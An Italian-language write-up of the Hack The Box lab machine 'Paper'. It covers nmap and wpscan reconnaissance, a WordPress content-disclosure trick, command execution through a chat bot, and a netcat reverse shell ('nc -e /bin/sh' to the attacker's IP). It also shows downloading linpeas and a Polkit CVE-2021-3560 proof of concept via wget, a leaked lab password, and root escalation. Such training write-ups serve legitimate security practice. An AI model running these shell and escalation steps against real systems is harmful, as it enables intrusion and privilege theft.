# HTB-Paper
My write up of the Machine "Paper" of HTB
# MACHINE PAPER 

## 1) Trovare quali porte sono aperte:

```zsh
$ nmap -sC -sV {IP TARGET}
```
sC = ( Script = default ) </p>
sV = Mostrare le porte aperte

### Cosa Scopriamo con " nmap " :
Porte 22/tcp ssh , 80/tcp http (Apache/Openssl/Trace)

## 2) Facciamo una Get Request per vedere che ci ritorna:

```zsh
$ curl --head 10.10.11.143
```
head = Header, parte senza body

### Cosa scopriamo con " curl " :
X-Backend-Server: office.paper 

## 3) Aggiungiamo office.paper agli host:

```zsh
$ sudo nano /etc/hosts
```

Dentro il file fate invio ed aggiungete:
{IP TARGET } office.paper
(per salvare il file fate {CTRL + O} poi {CTRL + X })

## 4) Andiamo a vedere il nuovo sito:

Come visto dal curl vediamo che è HTTP perciò scriviamo HTTP://office.paper e dovrebbe aprirsi un nuovo sito

## 5) Guardiamo il sito:

Guardando in giro vediamo una pagina Login. Se clicchiamo vediamo che si apre una pagina WordPress.

## 6) Sito WordPress scanniamolo:
```zsh
$ wpscan --url HTTP://office.paper
```
Wpscan = Wordpress Security Scanner

### Cosa scopriamo con " wpscan " :

Scopriamo che viene utilizzata la versione Wordpress 5.2.3 (Insecure, released on 2019-09-05)

## 7) Cerchiamo se esiste un exploit per WordPress 5.2.3:

Cercando scopriamo che esiste "?static=1" che aggiunto al URL mostra i "contenuti segreti"

### Cosa scopriamo con l'exploit :
Scopriamo una pagina segreta che rimanda a un sito "http://chat.office.paper"

## 8) Aggiungiamo la nuova pagina a /etc/hosts:

```zsh
$ sudo nano /etc/hosts
```

Dentro il file andate sull'aggiunta di prima:
{IP TARGET } office.paper chat.office.paper
(per salvare il file fate {CTRL + O} poi {CTRL + X })

## 9) Entrando nel link nuovo:

Entriamo nel link nuovo e ci registriamo, scopriamo la esistenza di un bot, apriamo un chat con lui e notiamo che se scriviamo "file test" si collega alla directory "/home/dwight/sales/test".
Notiamo che esiste il comando list, quindi facciamo "list .." e vediamo che esiste il file user.txt, ma se facciamo "file ../user.txt" ci dice "Access denied".


Notiamo che tra i vari file/directory esiste hubot che cercando su internet è un bot in cui puoi inserire custom scripts e che si possono trovare all'interno della directory.

Torniamo nella chat e scriviamo "list ../hubot/scripts"

Poi andiamo in file "file ../hubot/scripts/files.js" e scopriamo che possiamo runnare i comandi che vogliamo scrivendo "run command" 

Scriviamo "run ls"

## 10) Usiamo netcat come listener:

```zsh
$ nc -lvnp 4444
```
l = listenmode

v = verbose 

n = suppress name

p = localport to use 


## 11) Connettiamo il hubot a noi : 

```zsh
$ nc -e /bin/sh {IP tun0} 4444
```
/bin/sh = shell </p>
IP tun0 =su terminale -> ifconfig OPPURE ip addr -> cercate tun0 e trovate inet che è l'ip che ci serve

## 12) Collegati:

Scriviamo nello stesso terminale -> id -> scopriamo che siamo dentro come dwight

## 13) Troviamo la prima Flag:

ls -> dir .. 

Vediamo che nella direcotry prima esiste "user.txt"

scriviamo quinti -> cat ../user.txt

Così otteniamo la prima flag

## 14) Apriamo bash:

Inseriamo questo comando "python3 -c 'import pty; pty.spawn("/bin/bash")'" in modo che si apra in bash non più shell.
Scriviamo Python3 se non funziona si scrive Python

## 15) Guardiamo cosa c'è nelle varie directory :
 notiamo che esiste il file linpeas.sh

 Se non c'è il file linpeas.sh -> "https://github.com/carlospolop/PEASS-ng/releases/tag/20220220" lo scaricate da qui.

## 15 B ) Come mettere linpeas.sh nel caso non ci fosse :

 Si va nella directory dove si è scaricato e aprite il terminale li

```zsh
$ python3 -m http.server 80
```

POI andate nel terminale dove sta " nc " in cui siete collegati al bot e scrivete 

```zsh
$ wget  {IP tun0}/linpeas.sh
```

## 16) Facciamo partire linpeas.sh:

```zsh
$ ./linpeas.sh
```
se non parte subito scrivete

```zsh
$ chmod +x linpeas.sh
```
poi fate ripartire 

```zsh
$ ./linpeas.sh
```

## 17) Cosa abbiamo scoperto con linpeas.sh:

ROCKETCHAT_USER=recyclops

ROCKETCHAT_PASSWORD=Queenofblad3s!23

E

In rosso "runc was found in /usr/bin/runc, you may be able to escalate privileges with it"

## 18) Proviamo a collegarci tramite ssh a dwight:

```zsh
$ ssh dwight@10.10.11.143
```
Password : Queenofblad3s!23

## 19) Utilizziamo una escalate priviliges:

Cercando su internet si trova Polkit 

## 20) Se non c'è il file poc.sh:
 "https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation" lo scaricate da qui.

## 20 B ) Come mettere poc.sh se non ci fosse :

Si va nella directory dove si è scaricato e aprite il terminale li

```zsh
$ python3 -m http.server 80
```

POI andate nel terminale dove sta " nc " in cui siete collegati al bot e scrivete 

```zsh
$ wget  {IP tun0}/poc.sh
```

## 21) Facciamo partire poc.sh:

```zsh
$ ./poc.sh
```
se non parte subito scrivete

```zsh
$ chmod +x poc.sh
```
poi fate ripartire 

```zsh
$ ./poc.sh
```
Dopo vari tentativi scrivete

```zsh
$ su secnigma
```
Provate la password: "secnigmaftw"

e cosi via finchè funziona

## 22) Come entrare nel root:

```zsh
$ sudo bash
```

rimettiamo la password

se siamo entrati dentro root dovremmo vedere un #

## 23) Seconda flag:

facciamo cd ../.. fino al [/] che sarebbe un cd .. quando abbiamo che ls è Dwight

poi

```zsh
$ cd /root/
```

```zsh
$ ls
```

```zsh
$ cat root.txt
```


# FINISH 
<sup><p align="right"> Stiven Sharra , Alberto Zabeo</sup> </p>
